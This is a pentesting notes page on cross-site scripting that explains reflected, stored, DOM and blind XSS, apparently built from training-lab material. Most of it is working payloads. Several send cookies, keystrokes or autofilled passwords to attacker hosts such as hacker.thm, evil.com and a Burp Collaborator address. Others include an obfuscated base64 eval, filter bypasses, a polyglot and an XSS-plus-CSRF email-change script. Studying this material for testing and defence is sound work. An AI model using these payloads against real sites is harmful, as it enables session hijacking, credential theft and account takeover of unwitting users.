---
title: XSS
source_url: https://notes.incendium.rocks/pentesting-notes/web/xss
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---

Cross-Site Scripting, better known as XSS in the cybersecurity community, is classified as an injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users.

***

## Payloads

In XSS, the payload is the JavaScript code we wish to be executed on the targets computer. There are two parts to the payload, the intention and the modification.

```jsx
<script>alert('XSS');</script>
```

**Session Stealing:**

Details of a user's session, such as login tokens, are often kept in cookies on the targets machine. The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged.

**Note**: Also try to URL encode your payload if there is no cookie in the response

```jsx
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Key Logger:**

The below code acts as a key logger. This means anything you type on the webpage will be forwarded to a website under the hacker's control. This could be very damaging if the website the payload was installed on accepted user logins or credit card details.

```jsx
<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>
```

**Business Logic:**

This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`. Your payload could look like this:

```jsx
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Auto-fill payload:**

This payload attempts to get someone's username/password from the auto-fill functionality within password managers:

```html
<b>Username:</><br>
<input name=username id=username>
<b>Password:</><br>
<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

***

## Reflected XSS

Reflected XSS happens when user-supplied data in an HTTP request is included in the webpage source without any validation.

**How to test for Reflected XSS:**

You'll need to test every possible point of entry; these include:

* Parameters in the URL Query String
* URL File Path
* Sometimes HTTP Headers (although unlikely exploitable in practice)

**Example Scenario:** A website where if you enter incorrect input, an error message is displayed. The content of the error message gets taken from the **error** parameter in the query string and is built directly into the page source.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/a5b0dbc4d2f1f69988f82f2c5d53f6ed.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/7f90b73106d655b07874943f93533f7b.png)

The application doesn't check the contents of the **error** parameter, which allows the attacker to insert malicious code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/66743e9fa50b4c5793f070eb505f72d1.png)

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5efe36fb68daf465530ca761/room-content/24e50d95cecfc3783bd1a3a4fecbf310.png)

### XSS in JavaScript template literals <a href="#xss-in-javascript-template-literals" id="xss-in-javascript-template-literals"></a>

JavaScript template literals are string literals that allow embedded JavaScript expressions. The embedded expressions are evaluated and are normally concatenated into the surrounding text. Template literals are encapsulated in backticks instead of normal quotation marks, and embedded expressions are identified using the `${...}` syntax.

For example, the following script will print a welcome message that includes the user's display name:

```javascript
document.getElementById('message').innerText = `Welcome, ${user.displayName}.`;
```

When the XSS context is into a JavaScript template literal, there is no need to terminate the literal. Instead, you simply need to use the `${...}` syntax to embed a JavaScript expression that will be executed when the literal is processed. For example, if the XSS context is as follows:

```html
<script> ... var input = `controllable data here`; ... </script>
```

then you can use the following payload to execute JavaScript without terminating the template literal:

```javascript
${alert(document.domain)}
```

***

## **Stored XSS**

As the name infers, the XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page.

\*\*Potential Impact:\*\*The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.

**How to test for Stored XSS:**

You'll need to test every possible point of entry where it seems data is stored and then shown back in areas that other users have access to; a small example of these could be:

* Comments on a blog
* User profile information
* Website Listings

### XSS in HTML tag attributes <a href="#xss-in-html-tag-attributes" id="xss-in-html-tag-attributes"></a>

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

```javascript
" autofocus onfocus=alert(document.domain) x="
```

The above payload creates an `onfocus` event that will execute JavaScript when the element receives the focus, and also adds the `autofocus` attribute to try to trigger the `onfocus` event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup.

### XSS + CSRF to change e-mail

```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() {
        var token = this.response.getElementsByName('csrf')[0].value;
	xhr.open('POST', '/my-account/change-email', true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.send(new URLSearchParams({
	    'email': 'pwned@gmail.com',
	    'csrf': token
	    })
	    );
};
xhr.open('GET', '/my-account', true);
xhr.responseType = "document";
xhr.send();

</script>
```

***

## DOM Based XSS

**What is the DOM?**

DOM stands for **D**ocument **O**bject **M**odel and is a programming interface for HTML and XML documents. It represents the page so that programs can change the document structure, style and content.

DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.

**Example Scenario:**

The website's JavaScript gets the contents from the **window\.location.hash** parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.

### DOM XSS with html.replace

The `replace()` built-in function in JavaScript does replace all occurrences if you use the 'g' flag in the regular expression but the developer miss it, so it will replace the first occurrence only for the starting and the closing tag.

```javascript
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

To bypass the encoding, we can use this payload:

```javascript
<img><img src=x onerror=alert(1)>
```

### AngularJS expression

If a framework like [AngularJS](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection) is used, it may be possible to execute JavaScript without angle brackets or events. When a site uses the `ng-app` attribute on an HTML element, it will be processed by AngularJS. In this case, AngularJS will execute JavaScript inside double curly braces that can occur directly in HTML or inside attributes.

```javascript
{{ $eval.constructor('alert()')() }}
```

### Webmessages simple

We can exploit scripts that use webmessages to load content into the page

```html
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
```

Now, we craft a iframe using onload to call a postMessage with the following XSS payload:

```html
<iframe src="https://vulnerable.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```

This will call the print() function.

### Webmessages with JSON.Parse

Consider the following javascript code:

```javascript
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```

It makes a iframe for a webmessage that the page gets. Then it parses the data with JSON.parse. If the json data includes "load-channel" it will set ACMEplayer.element.src to our data.url. We can use this to execute our own JS code:

```html
<iframe
    src="https://vulnerable.net/"
    onload='contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:print()\"}","*");'
></iframe>
```

### Cookie manipulation

Consider the following DOM based vulnerability:

```javascript
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

If their are no filters and CORS is also no problem, we can easily get XSS using something like this:

```html
<iframe src="https://0aea00e1048b99fc81b48404006d005d.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://vulnerable.net';window.x=1;">
```

### Base64 payload

We can use a base64 payload to avoid syntax or filters:

```
fetch(`https://COLLAB/?xss=` + window["document"]["cookie"])
```

Becomes:

```javascript
eval(atob("ZmV0Y2goYGh0dHBzOi8vY29sbGFib3JhdG9yLz94c3M9YCArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p"))
```

### No parentheses cookie stealing

1:

```
\\"};location=`javascript:fetch\x28'https://evil.com/cookie='+document.cookie\x29`//
```

2:

```
\\"-setTimeout`fetch\x28'https://evil.com/cookie='+document.cookie\x29`}//
```

***

## Blind XSS

Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first.

**Example Scenario:**

A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

**How to test for Blind XSS:**

When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.

A popular tool for Blind XSS attacks is [xsshunte](https://xsshunter.com/)r. Although it's possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.

***

### Perfecting your payload

**1) Escape input tag**

```jsx
"><script>alert('THM');</script>
```

The important part of the payload is the `">` which closes the value parameter and then closes the input tag.

**2) Escape textarea tag**

We'll have to escape the textarea tag a little differently from the input one (in Level Two) by using the following payload:

```jsx
</textarea><script>alert('THM');</script>
```

**3) Escape javascript**

```jsx
';alert('THM');//
```

. The `'`closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.

**4) Bypass filter**

The word script gets removed from your payload, that's because there is a filter that strips out any potentially dangerous words. When a word gets removed from a string, there's a helpful trick that you can try.

**Original Payload:**

```jsx
<sscriptcript>alert('THM');</sscriptcript>
```

**Text to be removed (by the filter):**

```jsx
<sscriptcript>alert('THM');</sscriptcript>
```

**Final Payload (after passing the filter):**

```jsx
<script>alert('THM');</script>
```

**5) Escape IMG tag**

Let's change our payload to reflect this `/images/cat.jpg" onload="alert('THM');` and then viewing the page source, and you'll see how this will work.

**6)** **Polyglots**

An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one.

```jsx
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```

## XSS contexts
